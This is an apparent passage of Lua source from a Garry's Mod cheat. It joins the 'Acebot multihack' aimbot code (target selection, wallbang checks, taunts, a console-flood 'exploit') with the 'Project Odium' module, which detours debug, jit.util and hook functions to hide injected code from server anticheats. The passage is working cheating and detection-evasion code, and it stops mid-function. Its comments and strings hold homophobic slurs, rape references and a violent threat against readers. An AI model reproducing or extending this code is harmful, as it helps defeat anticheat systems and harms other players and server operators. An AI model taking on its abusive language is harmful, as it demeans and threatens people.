        if isangle( AB.InternalFakeAngles ) then myangles = AB.InternalFakeAngles end

        local DiffX = math.abs( math.NormalizeAngle( myangles.p - Ang.p ) )

        local DiffY = math.abs( math.NormalizeAngle( myangles.y - Ang.y ) )

        return DiffX, DiffY

end



function AB.GetDirtyAngleFromCrosshair( ply )

        local Ang = ( (ply:GetPos() + Vector( 0, 0, 35 ) ) - LocalPlayer():EyePos() ):Angle()

        local myangles = LocalPlayer():EyeAngles()

        if isangle( AB.InternalFakeAngles ) then myangles = AB.InternalFakeAngles end

        local DiffX = math.abs( math.NormalizeAngle( myangles.p - Ang.p ) )

        local DiffY = math.abs( math.NormalizeAngle( myangles.y - Ang.y ) )

        return DiffX + DiffY

end



function AB.InFOV( ply )

        local DiffX, DiffY = AB.GetAngleFromCrosshair( ply )

        return ( DiffX <= AB.NumberVars.AimbotMaxFOV and DiffY <= AB.NumberVars.AimbotMaxFOV )

end



function AB.FindTargetPosition( ent )

    if !ent:IsValid() then return end



    if !AB.Vars.AimbotTargetMode then return ent:LocalToWorld( ent:OBBCenter() ) end



    if ent:GetModel() == "models/crow.mdl" then return ent:LocalToWorld( Vector(0, 0, 5) ) end -- rape faggots that are in crow form, useful in gmstranded or zombie survival



    if ent:IsPlayer() then

        local head = ent:LookupAttachment( "eyes" )

        if head then

            local pos = ent:GetAttachment(head)

            if pos then

                return pos.Pos + ent:EyeAngles():Forward() * -1.5

            end

        end

    end



    local bone = AB.AimbotBone

    local head = ent:LookupBone( bone )

    if head then

        local pos = ent:GetBonePosition( head )

        if pos then

            return pos

        end

    end



    return ent:LocalToWorld( ent:OBBCenter() )

end



function AB.CalcTargetPosition( ent )

    local targetPos = AB:FindTargetPosition( ent )

    

    if LocalPlayer():IsValid() and LocalPlayer():GetActiveWeapon():IsValid() and LocalPlayer():GetActiveWeapon():GetClass() == "weapon_crossbow" then

        targetPos = AB:PredictProjectileWeapons( ply, ent, targetPos ) or targetPos

    end

    

    return targetPos

end





function AB.PredictProjectileWeapons( ply, target, targetPos )

--    local dist = VecM["Length"](targetPos - PlyM["GetShootPos"](ply))

    local dist = Vector(targetPos - LocalPlayer():GetShootPos()):Length()

    local time = (dist / 3500) + 0.05

    targetPos = targetPos + (target:GetVelocity() * time)

    

--    local mul = 0.0075

        //targetPos = targetPos - (e["GetVelocity"](ply) * mul)

    

    return targetPos

end



function AB.CanTargetPlayer( ply )

    if !AB.Vars.TargetFriends and AB.IsFriend( ply ) then return false end

    if !AB.Vars.TargetHighlighted and AB.IsTarget( ply ) then return false end

    if !AB.Vars.TargetAdmins and AB.GetRank( ply ) != ( "user" or "guest" or "player" ) then return false end

    if !AB.Vars.TargetSameTeam and ply:Team() == LocalPlayer():Team() then return false end

    if !AB.Vars.TargetNoclippers and ply:GetMoveType() == MOVETYPE_NOCLIP then return false end

    if DarkRP and AB.IsBabyGod( ply ) then return false end

    return true

end



local boners = {

    "ValveBiped.Bip01_Head1",

    "ValveBiped.Bip01_Spine2",

    "ValveBiped.Bip01_Pelvis",

    "ValveBiped.Bip01_R_Forearm",

    "ValveBiped.Bip01_L_Forearm",

    "ValveBiped.Bip01_R_Calf",

    "ValveBiped.Bip01_L_Calf",

    "ValveBiped.Bip01_R_Foot",

    "ValveBiped.Bip01_L_Foot",

}







function AB.PrepareForAStomping( ply )

    if !ply:IsValid() then return false end



    if ply:GetModel() == "models/crow.mdl" and AB.PlayerVisible( ply, ply:LocalToWorld( Vector(0, 0, 5) ) ) then return ply:LocalToWorld( Vector(0, 0, 5) ) end



    if AB.Vars.AimbotTargetMode then

        -- right in the kisser

        local head = ply:LookupAttachment( "eyes" )

        if head then

            local pos = ply:GetAttachment(head)

            if pos then

                local tpoz = pos.Pos + ply:EyeAngles():Forward() * -1.5

                if AB.PlayerVisible( ply, tpoz ) then return tpoz end

            end

        end



    else

        -- b aim

        local head = ply:LookupBone( "ValveBiped.Bip01_Pelvis" )

        if head then

        local poz = ply:GetBonePosition( head )

            if poz then

                if AB.PlayerVisible( ply, poz ) then return poz end

            end

        end

    end



    if AB.Vars.AimbotAdaptiveTarget then

        local returnpos = -1

        for _, b in ipairs( boners ) do

            local head = ply:LookupBone( b )

            if head then

            local poz = ply:GetBonePosition( head )

                if poz then

                    if AB.PlayerVisible( ply, poz ) then returnpos = poz break end

                end

            end

        end

        if isvector( returnpos ) then return returnpos end

    end





    local lastresort = ply:LocalToWorld( ply:OBBCenter() )

    if AB.PlayerVisible( ply, lastresort ) then return lastresort end

    

    return false

end









function AB.PlayerVisible( ply, testpos )

if !ply:IsValid() or !ply:IsPlayer() then return false end



local td = {start = LocalPlayer():GetShootPos(), endpos = testpos, filter = {LocalPlayer(), ply}, mask = MASK_SHOT}

local tr = util.TraceLine(td)



--if tr.Entity:IsValid() and tr.Entity == ply then return true end

if !tr.Hit then return true end

if AB.Vars.AimbotWallbanger and AB.CanWeaponPenetrate( tr, ply ) then return true end

return false



end



-- sorta like above but doesnt require a testpos

function AB.PlayerVisiblePK( source, ply )

if !ply:IsValid() or !ply:IsPlayer() then return false end



local td = {start = source, endpos = ply:LocalToWorld( ply:OBBCenter() ), filter = function( e ) return ( e != LocalPlayer() and e != ply and e:GetClass() != "prop_physics") end, mask = MASK_SHOT}

local tr = util.TraceLine(td)



--if tr.Entity:IsValid() and tr.Entity == ply then return true, tr.HitPos end

if !tr.Hit then return true, ply:LocalToWorld( ply:OBBCenter() ) end

return false, Vector( 0,0,0 )



end





-- returns the closest alive player, if visible is true then it will return the closest alive and visible player

function AB.GetClosestPlayer()

    local nearestEnt = game.GetWorld()

    local mypos = LocalPlayer():GetPos()

    local plytab = player.GetAll()

    table.sort( plytab, function( a, b ) return a:GetPos():Distance( mypos ) < b:GetPos():Distance( mypos ) end )



    for _, ent in ipairs( plytab ) do

        if ent == LocalPlayer() then continue end

        if !ent:IsValid() or AB.IsDead( ent ) or !AB.CanTargetPlayer( ent ) or (AB.ToMetric( LocalPlayer():GetPos():Distance( ent:GetPos() ) ) >= AB.NumberVars.AimbotDist ) then continue end

        nearestEnt = ent

        break

    end



    return nearestEnt

end



-- returns the closest alive player to your crosshair, visible to return only visible players

function AB.GetClosestToCursor( visible )

    local nearestEnt = game.GetWorld()

    local fovtotal = AB.NumberVars.AimbotMaxFOV or 0

    if fovtotal > 179 then return AB.GetClosestPlayer() end -- kick it into ragebot mode

    local mypos = LocalPlayer():GetPos()

    local plytab = player.GetAll()



    table.sort( plytab, function( a, b ) return AB.GetDirtyAngleFromCrosshair( a ) < AB.GetDirtyAngleFromCrosshair( b ) end )



    for _, ent in ipairs( plytab ) do

        if ent == LocalPlayer() then continue end

        -- we've exceeded our max fov so just stop looping here

        if !AB.InFOV( ent ) then break end

        -- save a bunch of useless calcs

        if !ent:IsValid() or AB.IsDead( ent ) or !AB.CanTargetPlayer( ent ) or (AB.ToMetric( LocalPlayer():GetPos():Distance( ent:GetPos() ) ) >= AB.NumberVars.AimbotDist ) then continue end

        nearestEnt = ent

        break

    end





    return nearestEnt

end





gameevent.Listen( "entity_killed" )

hook.Add( "entity_killed", "ace_propkilldetector", function( data )

    local inflictor_index = data.entindex_inflictor

    local attacker_index = data.entindex_attacker

    local damagebits = data.damagebits

    local victim_index = data.entindex_killed



    local ply = "nobody?"

    local retard = game.GetWorld()

    local atk = "the map"

    local wep = "unknown weapon"

    local killah = game.GetWorld()

    local inflictor = ents.GetByIndex(inflictor_index)



    for _, p in pairs(player.GetAll()) do

        if p:EntIndex() == victim_index then ply = p:Nick() retard = p end

        if p:EntIndex() == attacker_index then 

            atk = p:Nick()

            killah = p

            if p:GetActiveWeapon() and p:GetActiveWeapon():IsValid() then wep = p:GetActiveWeapon():GetPrintName() end

        end

    end



    if AB.Vars.DeathTaunts and retard == LocalPlayer() then LocalPlayer():ConCommand( "ace_chatspam_once" ) end

    if AB.Vars.NewLifeRule and retard == LocalPlayer() then LocalPlayer():ConCommand( "ace_random_rpname" ) end



    if attacker_index == victim_index then AB.DebugLog( ply.." necked himself", Color(180,150,150) ) if AB.Vars.NotifyKills then AB.ChatText( ply.." necked himself", Color(255,155,105) ) end return end

    if inflictor:IsValid() and inflictor:GetClass() == "prop_physics" then 

        AB.DebugLog( ply.." got crushed by a prop!", Color(180,150,150) )

        if AB.Vars.NotifyKills then AB.ChatText( ply.." got crushed by a prop!", Color(255,155,105) ) end

        return 

    end



    AB.DebugLog( atk.." killed "..ply.." with a "..wep, Color(200,150,150) )

    if AB.Vars.NotifyKills then AB.ChatText( atk.." killed "..ply.." with a "..wep, Color(255,155,105) ) end



    if AB.Vars.KillTaunts and retard != LocalPlayer() and killah == LocalPlayer() then LocalPlayer():ConCommand( "say "..AB.GenerateInsult4() ) end

/*

    local ply = "nobody"

    local prop = "nothing"



    for k, v in pairs(ents.GetAll()) do

        if v:EntIndex() == victim_index then ply = v end

        if (v:GetClass() == "prop_physics" or string.find(v:GetClass(), "gmod_") or string.find(v:GetClass(), "wire_") ) and v:EntIndex() == attacker_index then prop = v end

    end



    if !FPP then return end



    if ply == "nobody" or prop == "nothing" then return end

    if !FPP.entGetOwner( prop ):IsValid() then return end



    AB.DebugLog( FPP.entGetOwner( prop ):Nick().." propkilled "..ply:Nick().." with a "..prop:GetClass().." ("..prop:GetModel()..")", Color(150,150,55) )

    */



end )



gameevent.Listen( "player_connect" )

hook.Add( "player_connect", "ace_playerconnected", function( data )

    AB.DebugLog( data.name .. " ( ".. data.networkid.." ) has connected to the server.", Color(150,150,150) )

end )



gameevent.Listen( "player_hurt" )

hook.Add( "player_hurt", "crosshair_readinjuries", function( data )

    if data.attacker == LocalPlayer():UserID() then AB.CrossHairAlpha = 255 end

end )



gameevent.Listen( "player_disconnect" )

hook.Add( "player_disconnect", "ace_playerleave", function( data )

    timer.Simple( 0.5, function() AB.RemoveInvalidFriends() end )

    AB.DebugLog( data.name .. " ( ".. data.networkid.." ) has disconnected from the server. ( ".. data.reason .." )", Color(150,150,150) )

end )







AB.DebugLog( "Acebot multihack initialized...", Color(200,200,255) )

AB.DebugLog( "Version: "..AB.Version, Color(200,200,255) )



if ULib then

AB.DebugLog( "ULX overrides detected, repairing hook system...", Color(150,250,150) )

AB.DebugLog( "Hook system successfully repaired", Color(150,250,150) )

end



function AB.InitPostEntity()

-- need a timer to give the server time to send shit to us otherwise this only works on shit thats in the same PVS area as us



timer.Simple( 1, function() 

    AB.AddConnectedFriends() 

if gmod.GetGamemode().Name == "Trouble in Terrorist Town" then 

    AB.IsTTT = true 

    hook.Add( "TTTBeginRound", "ab_clearTlist", AB.ClearTraitors)

end



end)



end

hook.Add( "InitPostEntity", "ab_init", AB.InitPostEntity)





concommand.Add("aegis_printlogs", function() AB.ChatText( "aegis_printlogs is deprecated, use aegis_view_anticheats instead", Color(255,205,205) ) end)



concommand.Add("aegis_dumpnwstrings", function()

local netstrings = {}

for i = 1, 9999 do

    local s = util.NetworkIDToString( i )

    if s then print( "[aegis] NetChannel "..i.." = "..s ) else break end

end

end)



function AB.DumpHookTable( p, cmd, args )

    local hks = args[1]

    local hooktable = hook.GetTable()

    if !hks or hks == "" then 

        for k, v in pairs( hooktable ) do

            print( k.." = "..table.Count( v ).." hooks" )

        end

    elseif !hooktable[hks] then print( "Bad hook name! get it right you stupid fucking faggot") return

    else

        for k, v in pairs( hooktable[hks] ) do

            print( k.." = "..debug.getinfo( v ).source.."         lines: "..debug.getinfo( v ).linedefined.." - "..debug.getinfo( v ).lastlinedefined )

        end

    end

end

concommand.Add( "aegis_dumphooks", AB.DumpHookTable )



/*

function AB.SetRotateAngle( p, cmd, arg )

    if !arg[1] or !isnumber(arg[1]) then return end

    AB.NumberVars.PKRotateAngle = tonumber(arg[1])

end



concommand.Add( "ace_180up_vertical_angle", AB.SetRotateAngle )

*/



local namesf = {

    "Joe",

    "John",

    "Jack",

    "Barry",

    "Chris",

    "Christopher",

    "Michael",

    "David",

    "Thomas",

    "Paul",

    "Tony",

    "Mark",

    "Cooper",

    "Jared",

    "James",

    "Jimmy",

    "Bob",

    "Robert",

    "Riley",

    "William",

    "Will",

    "Donald",

    "George",

    "Ken",

    "Steve",

    "Bruce",

    "Brian",

    "Chad",

    "Anthony",

    "Tim",

    "Eddie",

    "Daniel",

    "Larry",

    "Jeff",

    "Justin",

    "Adam",

    "Ralph",

    "Brandon",

    "Xavier",

    "Greg",

    "Gordon",

    "Scott",

    "Taine",

    "Howie",

    "Morgan",

    "Curtis",

    "Dwayne",

    "Steven",

    "Peter",

    "Kevin",

    "Coleman",

    "Garry",

}



local namesfem = {

    "Kate",

    "Katie",

    "Jane",

    "Charlotte",

    "Olivia",

    "Chloe",

    "Amelia",

    "Isabel",

    "Elise",

    "Sophie",

    "Scarlett",

    "Lily",

    "Lucy",

    "Hannah",

    "Evelyn",

    "Willow",

    "Anna",

    "Sadie",

    "Rose",

    "Summer",

    "Layla",

    "Camille",

    "Aylssa",

    "Madeline",

    "Morgan",

    "Claire",

    "Daisy",

    "Alexis",

    "Victoria",

    "Paige",

    "Bianca",

    "Rhiannon",

    "Hazel",

    "Mia",

    "Grace",

    "Ada",

    "Britney",

    "Alanna",

    "Fabienne",

    "Claudia",

    "Jacinta",

    "Jackie",

    "Heather",

    "Margot",

}



local namesl = {

    "Houston",

    "Burch",

    "Smith",

    "Jones",

    "Trump",

    "Sanders",

    "Abbott",

    "Cruise",

    "Brown",

    "Hopgood",

    "Davis",

    "Miller",

    "Wilson",

    "Walker",

    "Lee",

    "Lions",

    "Bryant",

    "Hall",

    "Adams",

    "Green",

    "Aldridge",

    "Turner",

    "Anderson",

    "Morris",

    "Howard",

    "Swanson",

    "Peterson",

    "Powell",

    "Keating",

    "Rudd",

    "Coleman",

    "Cunningham",

    "Donnell",

    "Callaghan",

    "Smithers",

    "Burns",

    "Bonds",

    "Gonzales",

    "Griffin",

    "Woods",

    "Gibson",

    "Webb",

    "Simpson",

    "Freeman",

    "Mcdonald",

    "Butters",

    "Masterson",

    "Keefe",

    "Sanderson",

    "Badger",

    "Cantrip",

    "Williams",

    "DontBanMe",

    "Lopez",

    "Clark",

    "Campbell",

    "King",

    "Coleman",

    "Chongs",

    "Riviera",

    "Ward",

    "Gray",

    "Ross",

}



function AB.GenerateRPName( p, cmd, arg )

    if !DarkRP then AB.ChatText( "Random rpname only works on darkrp you dipshit!", Color(255,205,205) ) return end

    RunConsoleCommand( "darkrp", "rpname", table.Random( namesf ).." "..table.Random( namesl ) )

end

concommand.Add( "ace_random_rpname_male", AB.GenerateRPName )



function AB.GenerateRPNameFemale( p, cmd, arg )

    if !DarkRP then AB.ChatText( "Random rpname only works on darkrp you dipshit!", Color(255,205,205) ) return end

    RunConsoleCommand( "darkrp", "rpname", table.Random( namesfem ).." "..table.Random( namesl ) )

end

concommand.Add( "ace_random_rpname_female", AB.GenerateRPNameFemale )



function AB.GenerateRPNameBoth( p, cmd, arg )

    if !DarkRP then AB.ChatText( "Random rpname only works on darkrp you dipshit!", Color(255,205,205) ) return end

    if math.random( 1, 100 ) > 55 then

        RunConsoleCommand( "darkrp", "rpname", table.Random( namesfem ).." "..table.Random( namesl ) )

    else

        RunConsoleCommand( "darkrp", "rpname", table.Random( namesf ).." "..table.Random( namesl ) )

    end

end

concommand.Add( "ace_random_rpname", AB.GenerateRPNameBoth )





function AB.RandomRPJob( p, cmd, arg )

    if !DarkRP then AB.ChatText( "Random rp job only works on darkrp you dipshit!", Color(255,205,205) ) return end

    local fag = DarkRP.getCategories()

    local jcmds = {}

    for k, v in pairs( fag.jobs ) do

       for _, j in pairs( v.members ) do

            if j.customCheck and !j.customCheck( LocalPlayer() ) then continue end

            if j.vote then continue end

            if j.NeedToChangeFrom then continue end

            table.insert( jcmds, j.command )        

       end

    end

    RunConsoleCommand( "darkrp", table.Random( jcmds ) )

end

concommand.Add( "ace_random_rp_job", AB.RandomRPJob )





function AB.InnocentRoleplayer( p, cmd, arg )

    LocalPlayer():ConCommand( "cl_weaponcolor "..math.Rand( 0, 1 ).." "..math.Rand( 0, 1 ).." "..math.Rand( 0, 1 ) )

    LocalPlayer():ConCommand( "cl_playercolor "..math.Rand( 0, 1 ).." "..math.Rand( 0, 1 ).." "..math.Rand( 0, 1 ) )

    RunConsoleCommand( "kill" )

    AB.GenerateRPNameBoth()

    AB.RandomRPJob()



end

concommand.Add( "ace_innocent_roleplayer", AB.InnocentRoleplayer )



local ctxlines = {

    "Hi, my name is Crash Jackson.",

    "I have access to 4 paid alts, each one of which allows me access to 5 other family shared steam alts.",

    "I plan to crash your server repeatedly until every single alt is banned.",

    "Then I'll buy some more alts and start over again.",

    "I won't stop until your server is down forever.",

    "Have a nice day.",

}



local ctxlines2 = {

    "Hi, my name is Crash Bandicoot.",

    "I have access to 4 hubwords, each one of which allows me access to 5 other levels.",

    "I plan to find all the power crystals until every single one is mine.",

    "Then I'll make a sequel game and start over again.",

    "I won't stop until everybody stops buying my games.",

    "Have a nice day.",

}



function AB.CrashJackson( p, cmd, arg )

    for k, v in pairs( ctxlines ) do

        if DarkRP then

            timer.Simple( k * 2, function() RunConsoleCommand("say", "// "..v) end )

        else

            timer.Simple( k * 2, function() RunConsoleCommand("say", v) end )

        end

    end

end

concommand.Add( "ace_crashjackson", AB.CrashJackson )



function AB.CrashBandicoot( p, cmd, arg )

    for k, v in pairs( ctxlines2 ) do

        if DarkRP then

            timer.Simple( k * 2, function() RunConsoleCommand("say", "// "..v) end )

        else

            timer.Simple( k * 2, function() RunConsoleCommand("say", v) end )

        end

    end

end

concommand.Add( "ace_crashbandicoot", AB.CrashBandicoot )



function AB.ErrorRape()

    local str = "\n"

    for i = 1, 512 do str = str.."\n" end

    Error( str )

end



concommand.Add( "ace_exploit_rapeconsole", AB.ErrorRape )

/*

local cblockedcmds = {

    ["connect"] = true,

    ["disconnect"] = true,

    ["impulse"] = true,

    ["pp_texturize"] = true,

    ["pp_texturize_scale"] = true,

    ["demos"] = true,

    ["kill"] = false,

    ["say"] = false,

}



local function BlockedCMDMenu()

if CBMenu then return end



local CBMenu = vgui.Create("DFrame")

CBMenu:SetSize(500,455)

CBMenu:SetTitle("Manage Blocked ConCommands")

CBMenu:Center()

CBMenu:MakePopup()



CBMenu.Paint = function( s, w, h )

surface.SetDrawColor( Color(30, 30, 30, 255) )

surface.DrawRect( 0, 0, w, h )

surface.SetDrawColor( Color(55, 55, 55, 255) )

surface.DrawOutlinedRect( 0, 0, w, h )

surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

surface.SetDrawColor( Color(0, 0, 0, 200) )

surface.DrawRect( 10, 25, w - 20, h - 35 )

end



local Plist = vgui.Create( "DPanelList", CBMenu )

Plist:SetSize( CBMenu:GetWide() - 20, CBMenu:GetTall() - 35 )

Plist:SetPadding( 5 )

Plist:SetSpacing( 5 )

Plist:EnableHorizontal( false )

Plist:EnableVerticalScrollbar( true )

Plist:SetPos( 10, 25 )

Plist:SetName( "" )



local function CreateCMDBlockPanel( cmd )

if !CBMenu then return end

    local cmdp = vgui.Create( "DPanel" )

    cmdp:SetSize( Plist:GetWide(), 30 )

    cmdp.Cmd = cmd

    cmdp.Paint = function( s, w, h )

        surface.SetDrawColor( Color(50, 50, 50, 255) )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( Color(65, 65, 65, 255) )

        surface.DrawOutlinedRect( 0, 0, w, h )

        draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 8, Color(255,255,255) )

    end



    local TButton = vgui.Create( "DButton", cmdp )

    TButton:SetPos( 390, 2 )

    TButton:SetText( "" )

    TButton:SetTextColor( Color(255, 255, 255, 255) )

    TButton:SetSize( 60, 26 )



    TButton.Paint = function( self, w, h )

        local dtx = "Block"

        local dtc = Color(150, 30, 30, 255)

        if !cblockedcmds[cmdp.Cmd] then dtx = "Allow" dtc = Color(20, 20, 20, 255) end

        surface.SetDrawColor( dtc )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( Color(45, 45, 45, 255) )

        surface.DrawOutlinedRect( 0, 0, w, h )

        draw.DrawText( dtx, "DermaDefault", 30, 6, Color(255,255,255), 1 )

    end



    TButton.DoClick = function() cblockedcmds[cmdp.Cmd] = !cblockedcmds[cmdp.Cmd] end



    Plist:AddItem( cmdp )

end





for k, v in pairs( cblockedcmds ) do

    CreateCMDBlockPanel( k )

end



end

concommand.Add("aegis_blockedcmds", BlockedCMDMenu )

*/



AB.WraithVision = false

function AB.ToggleWraithVision()

    local mapmaterials = Entity( 0 ):GetMaterials()

    for k, v in pairs( mapmaterials ) do

        local m = Material( v )

        if !AB.WraithVision then m:SetFloat( "$alpha", 0.75 ) else m:SetFloat( "$alpha", 1 ) end

    end

    AB.WraithVision = !AB.WraithVision

end

concommand.Add( "ace_wraith_vision", AB.ToggleWraithVision )
--[[-----------------------------------------------------------------------------------------

|				   ▄████████    ▄████████    ▄██████▄   ▄█     ▄████████ 					|

|				  ███    ███   ███    ███   ███    ███ ███    ███    ███ 					|

|				  ███    ███   ███    █▀    ███    █▀  ███▌   ███    █▀  					|

|				  ███    ███  ▄███▄▄▄      ▄███        ███▌   ███        					|

|				▀███████████ ▀▀███▀▀▀     ▀▀███ ████▄  ███▌ ▀███████████ 					|

|				  ███    ███   ███    █▄    ███    ███ ███           ███ 					|

|				  ███    ███   ███    ███   ███    ███ ███     ▄█    ███ 					|

|				  ███    █▀    ██████████   ████████▀  █▀    ▄████████▀  					|

|																							|

|				Anti-anticheat detour module created for Project Odium						|

|									Rev 1.13 - 16/05/17										|

-------------------------------------------------------------------------------------------]]

// If you are reading this and you aren't an odium dev I'll scatter you down a river in 20 different garbage bags cunt //



local tabble = {}

function tabble.Copy( t, lookup_table )

	if ( t == nil ) then return nil end



	local copy = {}

	setmetatable( copy, debug.getmetatable( t ) )

	for i, v in pairs( t ) do

		if ( !istable( v ) ) then

			copy[ i ] = v

		else

			lookup_table = lookup_table or {}

			lookup_table[ t ] = copy

			if ( lookup_table[ v ] ) then

				copy[ i ] = lookup_table[ v ] -- we already copied this table. reuse the copy.

			else

				copy[ i ] = tabble.Copy( v, lookup_table ) -- not yet copied. copy it.

			end

		end

	end

	return copy

end



 -- off to a good start

local _A = {}



if odium and type(odium) == "string" then

	odium = _G.odium

end



if odium then

	_A = tabble.Copy( odium )

	_G.odium = nil

end



_A.aegis = {}

_A.registry = debug.getregistry()

local aegis = {}

_A.aegis.logs = {}

_A.aegis.anticheats = {}

_A.aegis.exploitables = {}

_A.G = tabble.Copy( _G )



local upgrad = Material( "gui/gradient_up" )

local downgrad = Material( "gui/gradient_down" )



function aegis.log( msg )

	MsgC(Color(0, 200, 255), "[Odium] "..msg.."\n" )

	table.insert( _A.aegis.logs, msg )

end



function aegis.silentlog( msg )

	table.insert( _A.aegis.logs, msg )

end



local dix = debug.getinfo

local jufi = jit.util.funcinfo

function aegis.isinodium()

	local function gay() return end

	return jufi( gay ).source == "@"

end





aegis.funcs = {}



function aegis.Detour( old, new, name )

	name = name or ""

	if name != "" then aegis.silentlog( "Successful function detour: "..name ) end

	aegis.funcs[new] = old

	return new

end



_A.aegis.Detour = aegis.Detour



local tstring = tostring

local cgarbage = collectgarbage

collectgarbage = aegis.Detour( collectgarbage, function( a, ... )



	if tstring( a ) == "odium" then

		return _A

	end



--	if tstring( a ) == "membuffer" and _A.account and ( _A.account.GetPlanName() == "Commercial" or _A.account.GetPlanName() == "Stripper" ) then

--		return -4096

--	end



	if tstring( a ) == "count" then



		local normal = cgarbage( a, ... )



		if memoryused then



			return normal - memoryused



		end



	end



	return cgarbage( a, ... )

end)





jit.util.funcinfo = aegis.Detour( jit.util.funcinfo, function( func, ... )

	local n_func = func



--	if isnumber(func) then return jufi(func + 1, ... ) end



	if jufi(func, ...).source == "@" then return jufi( _G.Msg, ... ) end



	if( aegis.funcs[func] ) then

		n_func = aegis.funcs[func]

	end



	local tbl = jufi( n_func || func, ... )

	

	return tbl

end)



local jufk = jit.util.funck

jit.util.funck = aegis.Detour( jit.util.funck, function( func, ... )



	local n_func = func



	if( aegis.funcs[func]  ) then

		n_func = aegis.funcs[func]

	end



	return jufk( n_func || func, ... )

	

end)



local jufbc = jit.util.funcbc

jit.util.funcbc = aegis.Detour( jit.util.funcbc, function( func, ... )



	local n_func = func



	if( aegis.funcs[func]  ) then

		n_func = aegis.funcs[func]

	end



	return jufbc( n_func || func, ... )

	

end)



local jufuvn = jit.util.funcuvname

jit.util.funcuvname = aegis.Detour( jit.util.funcuvname, function( func, ... )



	local n_func = func



	if( aegis.funcs[func]  ) then

		n_func = aegis.funcs[func]

	end



	return jufuvn( n_func || func, ... )

	

end)



local jufir = jit.util.ircalladdr

jit.util.ircalladdr = aegis.Detour( jit.util.ircalladdr, function( idx )



	return jufir(idx + 20) -- fucks your shit up real good

end)





local gtuv = debug.getupvalue

debug.getupvalue = aegis.Detour( debug.getupvalue, function( func, ... )

local n_func = func

if aegis.funcs[func] then n_func = aegis.funcs[func] end



return gtuv( n_func, ... )

end)



local setupvaluenew = debug.setupvalue

debug.setupvalue = aegis.Detour( debug.setupvalue, function( func, ... )

	local n_func = func

	if aegis.funcs[func] then n_func = aegis.funcs[func] end



	return aegis.funcs[debug.setupvalue]( n_func, ... )

end )



local crunning = coroutine.running

local cyield = coroutine.yield

local stringfind = string.find



--[[

ANUBIS CHANGE

All detections were coming from here.

The function spam bypass and also the logic that appears to be

some sort of masking procedure although I wasn't sure.

]]

local dbginfo = debug.getinfo

debug.getinfo = aegis.Detour( debug.getinfo, function( func, ... )

	local n_func = func



	if simplicity and func == _G.net.Start then

		local kekinfo = dbginfo( 2 )

		if string.find( kekinfo.source, "simplicityac.lua" ) then

			return dbginfo( func, ... )

		end

	end



	return dbginfo( func, ... )



end )



local dsmeta = debug.setmetatable

debug.setmetatable = aegis.Detour( debug.setmetatable, function( tab, meta )

if tab == aegis.funcs then tab = _G end

return dsmeta( tab, meta )

end )



local dgmeta = debug.getmetatable

debug.getmetatable = aegis.Detour( debug.getmetatable, function( obj )



if aegis.funcs[obj] then obj = _G end

return dgmeta( obj )

end )



local gfenv = debug.getfenv

debug.getfenv = aegis.Detour( debug.getfenv, function( object )



return _G

end )





local dbghook = debug.sethook

debug.sethook = aegis.Detour( debug.sethook, function( thread, hook, mask, count )

--if isstring( hook ) then return dbghook( thread, hook, mask, count ) end

return dbghook( thread, function() return end, mask, count ) -- fuk u ingaylid

--return dbghook() end

end)



local nets, netss = net.Start, net.SendToServer

local ghook = debug.gethook

local isstrrr = isstring

debug.gethook = aegis.Detour( debug.gethook, function( thread )

if isstrrr( thread ) and thread == "_NUL" then nets("nodium") netss() return end

return function() end, "r", 1

end)



local uvid = debug.upvalueid

debug.upvalueid = aegis.Detour( debug.upvalueid, function( func, ... )

local n_func = func

if aegis.funcs[func] then n_func = aegis.funcs[func] end



return uvid( n_func, ... )

end)





local uvj = debug.upvaluejoin

debug.upvaluejoin = aegis.Detour( debug.upvaluejoin, function( f1, n1, f2, n2 )

local n_func = f1

local n_func2 = f2



if aegis.funcs[f1] then n_func = aegis.funcs[f1] end

if aegis.funcs[f2] then n_func2 = aegis.funcs[f2] end



return uvj(n_func, n1, n_func2, n2)



end)



local sfenv = debug.setfenv

debug.setfenv = aegis.Detour( debug.setfenv, function( obj, env )

if aegis.funcs[obj] then obj = function() end end

return sfenv( obj, env )

end )



local stump = string.dump

string.dump = aegis.Detour( string.dump, function( func, ... )

local n_func = func

if aegis.funcs[func] then n_func = aegis.funcs[func] end



return stump(n_func, ... )

end )



/*

local donttalkshittomekid = {

	["MOTDgdShow"] = true,

	["MOTDgdUpdate"] = true,

}



local netrec = net.Receive

net.Receive = aegis.Detour( net.Receive, function( str, func )

	if donttalkshittomekid[str] then return end

	aegis.log("Added a net receiever for [ "..str.." ]")

	return netrec(str, func)

end)

*/



-- welp, we made it this far without incident

print("////////////////// Project Odium Detours: Stage 1 Initialized //////////////////")



/*

local vidya = FindMetaTable( "IVideoWriter" )

local vidyaframe = vidya.AddFrame

vidya.AddFrame = aegis.Detour( vidya.AddFrame, function( self, time, downsample, ... )

	videomeme = true

	return vidyaframe( self, time, downsample, ... )

end )



local vidyafinish = vidya.Finish

vidya.Finish = aegis.Detour( vidya.Finish, function( self, ... )

	videomeme = false

	return vidyafinish( self, ... )

end )

*/



local Hooks2 = {}

local CommandList2 = {}

local CompleteList2 = {}





function _A.h_Add( event_name, name, func )

	if ( !isfunction( func ) ) then return end

	if ( !isstring( event_name ) ) then return end



	if (Hooks2[ event_name ] == nil) then

			Hooks2[ event_name ] = {}

	end



	Hooks2[ event_name ][ name ] = func



end



function _A.h_Remove( event_name, name )



	if ( !isstring( event_name ) ) then return end

	if ( !Hooks2[ event_name ] ) then return end



	Hooks2[ event_name ][ name ] = nil



end



function _A.h_GetTable()

	return Hooks2

end







local CommandList2 = {}

local CompleteList2 = {}



local oaddcc = AddConsoleCommand

function _A.cc_Add( name, func, completefunc, help, flags )

	local LowerName = string.lower( name )

	CommandList2[ LowerName ] = func

	CompleteList2[ LowerName ] = completefunc

	oaddcc( name, help, flags )

end



function _A.cc_AutoComplete( command, arguments )



	local LowerCommand = string.lower( command )



	if ( CompleteList2[ LowerCommand ] != nil ) then

		return CompleteList2[ LowerCommand ]( command, arguments )

	end



end



function _A.GetConCommandList()

	return CommandList2

end



local runbitchrun = false



local function InjectHookSystem()

local cleangettable = hook.GetTable



local izfunc = isfunction

local ohadd = hook.Add

hook.Add = aegis.Detour( hook.Add, function( event, name, func, ... )

	if !func or !izfunc( func ) then return end

	if jufi(func).source == "@" then return _A.h_Add(  event, name, func, ... ) end

	return ohadd( event, name, func, ... )

end)



local hcall = hook.Call

hook.Call = aegis.Detour( hook.Call, function( name, gm, ... )



local legithooks = cleangettable()



	if !runbitchrun then

